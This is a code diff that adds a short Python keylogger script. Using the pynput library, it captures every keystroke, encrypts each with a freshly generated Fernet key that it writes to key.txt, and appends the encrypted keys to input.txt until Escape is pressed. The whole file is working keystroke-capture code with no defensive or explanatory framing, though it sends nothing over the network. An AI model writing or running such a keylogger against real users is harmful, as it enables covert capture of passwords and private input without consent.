@@ -1,0 +1,32 @@
+import pynput
+import cryptography
+import re
+import os
+from cryptography.fernet import Fernet
+
+key = Fernet.generate_key()
+f = Fernet(key)
+print(key)
+with open("key.txt","wb") as y:
+    y.write(key)
+
+from pynput import keyboard
+with open("input.txt", 'wb') as x:
+    def on_press(key):
+        saved="{0}".format(key)
+        saved2=re.sub("'","",saved)
+        encrypted=f.encrypt(saved2.encode())
+        if key == keyboard.Key.esc:
+            
+            return False 
+        # if key == keyboard.Key.enter:
+        #     x.write(b"\n")
+        # if key == keyboard.Key.space:
+        #     x.write(b"\n")
+        # else:
+        x.write(encrypted+ b'\n')
+
+    # ...or, in a non-blocking fashion:
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    listener.join()
